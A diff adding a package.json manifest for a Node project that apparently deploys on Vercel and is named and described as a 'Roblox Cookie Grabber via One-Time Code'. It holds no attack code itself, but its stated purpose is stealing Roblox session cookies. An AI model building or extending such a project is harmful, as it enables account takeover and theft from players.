@@ -1,0 +1,12 @@
+{
+  "name": "roblox-cookie-grabber",
+  "version": "1.0.0",
+  "description": "Roblox Cookie Grabber via One-Time Code",
+  "main": "index.html",
+  "scripts": {
+    "dev": "vercel dev"
+  },
+  "dependencies": {
+    "node-fetch": "^2.6.1"
+  }
+}
